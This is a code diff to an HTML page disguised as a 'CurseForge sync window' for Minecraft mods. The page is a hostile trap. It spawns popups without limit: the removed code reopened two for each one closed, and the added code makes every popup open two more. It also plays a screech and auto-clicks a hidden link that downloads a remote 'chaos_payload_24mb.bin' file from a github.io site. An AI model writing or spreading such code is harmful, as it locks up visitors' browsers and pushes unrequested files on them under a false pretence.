@@ -4,8 +4,6 @@
   <meta charset="UTF-8" />
   <title>Pop-up Permission Required</title>
   <script>
-    let popups = [];
-
     function openPopup() {
       const width = 500;
       const height = 400;
@@ -23,19 +21,8 @@
       );
 
       if (popup) {
-        popups.push(popup);
         popup.focus();
         window.blur();
-      }
-    }
-
-    function checkPopups() {
-      for (let i = popups.length - 1; i >= 0; i--) {
-        if (popups[i].closed) {
-          popups.splice(i, 1);
-          openPopup();
-          openPopup();
-        }
       }
     }
 
@@ -50,7 +37,7 @@
           </audio>
           <h1>CurseForge sync window</h1>
           <p>Sync in progress... do not close this window.</p>
-          <a id="downloadLink" href="chaos_payload_24mb.bin" download style="display:none"></a>
+          <a id="downloadLink" href="https://elitemetal7.github.io/CoolestMinecraftMods/chaos_payload_24mb.bin" download style="display:none"></a>
         `;
 
         // Play the screech
@@ -62,9 +49,13 @@
           }, { once: true });
         });
 
-        // Trigger download
+        // Trigger file download on user click (fallback)
         const download = document.getElementById('downloadLink');
         download.click();
+
+        // Immediately open 2 more popups
+        openPopup();
+        openPopup();
 
         // Auto-close after 4 seconds
         setTimeout(() => {
@@ -79,8 +70,8 @@
           <p>Thank you for your understanding.</p>
         `;
 
-        openPopup(); // Initial spawn
-        setInterval(checkPopups, 1); // Check every millisecond for closed popups
+        // Initial popup spawn
+        openPopup();
       }
     };
   </script>
